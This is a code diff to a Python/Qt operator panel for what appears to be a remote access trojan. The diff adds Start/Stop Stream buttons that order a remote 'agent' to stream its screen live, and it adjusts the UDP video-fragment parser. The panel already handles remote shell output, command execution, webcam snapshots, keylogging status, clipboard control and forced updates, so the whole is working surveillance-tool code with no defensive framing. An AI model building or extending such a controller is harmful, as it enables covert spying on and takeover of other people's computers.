@@ -90,12 +90,11 @@ class FcUdpClient:
                 continue
             except Exception:
                 break
-            # relay→viewer: [T_VIDEO(1)][session(8)][kf(1)][fid(4BE)][idx(2BE)][cnt(2BE)][data]
-            if len(data) < 18 or data[0] != _T_VIDEO:
+            # relay→viewer: [T_VIDEO(1)][SID(8)][fid(4BE)][idx(2BE)][cnt(2BE)][data]
+            if len(data) < 17 or data[0] != _T_VIDEO:
                 continue
-            kf  = bool(data[9])
-            fid, idx, cnt = struct.unpack_from(">IHH", data, 10)
-            frag = data[18:]
+            fid, idx, cnt = struct.unpack_from(">IHH", data, 9)
+            frag = data[17:]
 
             if self._next_id is not None and fid < self._next_id and self._next_id - fid < 1000:
                 continue   # stale fragment
@@ -119,7 +118,7 @@ class FcUdpClient:
                 continue
 
             try:
-                self._frame_cb(frame_data, kf)
+                self._frame_cb(frame_data, False)
             except Exception:
                 pass
 
@@ -268,7 +267,8 @@ class RelayClient(QObject):
                    "power_result","shell_started","shell_output","command_result",
                    "privacy_result","webcam_snapshot_result","active_window_result",
                    "volume_result","monitors_result","clipboard_set_result",
-                   "force_update_result","keylog_status"):
+                   "force_update_result","keylog_status",
+                   "fastcap_start_result","fastcap_stop_result"):
             def _mk(e):
                 @sio.on(e)
                 def _h(data): sig.generic.emit(e, data)
@@ -533,11 +533,16 @@ class ScreenPanel(QWidget):
         self._rc_stat.setStyleSheet("color:#71717a;font-size:12px")
         self._fv_btn = QPushButton("⚡ Fast View"); self._fv_btn.setStyleSheet(_BTN_P)
         self._fv_btn.setVisible(False); self._fv_btn.clicked.connect(self._open_fv)
+        self._stream_start_btn = QPushButton("▶ Start Stream"); self._stream_start_btn.setStyleSheet(_BTN_P)
+        self._stream_start_btn.clicked.connect(self._start_stream)
+        self._stream_stop_btn  = QPushButton("■ Stop Stream");  self._stream_stop_btn.setStyleSheet(_BTN_S)
+        self._stream_stop_btn.setVisible(False); self._stream_stop_btn.clicked.connect(self._stop_stream)
         for dc, lbl2 in [("new","+ New"),("left","← Left"),("right","Right →"),("close","✕ Close")]:
             b = QPushButton(lbl2); b.setStyleSheet(_BTN_S); b.setProperty("dc", dc)
             b.clicked.connect(lambda _, x=dc: relay.emit("desktop_cmd",{"cmd":x,"_target":relay._agent}))
             rbl.addWidget(b)
         rbl.addWidget(self._rc_btn); rbl.addStretch()
+        rbl.addWidget(self._stream_start_btn); rbl.addWidget(self._stream_stop_btn)
         rbl.addWidget(self._fv_btn); rbl.addWidget(self._rc_stat)
         layout.addWidget(rcbar)
 
@@ -563,10 +568,31 @@ class ScreenPanel(QWidget):
 
     def set_fv_info(self, info: dict):
         self._fv_info = info; self._fv_btn.setVisible(True)
+        # Auto-open FastView if user already clicked Start Stream
+        if getattr(self, "_streaming_requested", False):
+            self._streaming_requested = False
+            self._open_fv()
 
     def _open_fv(self):
         if not self._fv_info: return
         self.fv_win.open_view(self._fv_info["session"], self._fv_info["password"])
+
+    def _start_stream(self):
+        if not self.relay._agent: return
+        self._streaming_requested = True
+        self._stream_start_btn.setVisible(False)
+        self._stream_stop_btn.setVisible(True)
+        self.relay.emit("fastcap_start", {"_target": self.relay._agent})
+
+    def _stop_stream(self):
+        if not self.relay._agent: return
+        self._streaming_requested = False
+        self._stream_stop_btn.setVisible(False)
+        self._stream_start_btn.setVisible(True)
+        self._fv_btn.setVisible(False)
+        self._fv_info = None
+        self.fv_win.close_view()
+        self.relay.emit("fastcap_stop", {"_target": self.relay._agent})
 
     def _toggle_rc(self):
         self._rc = not self._rc
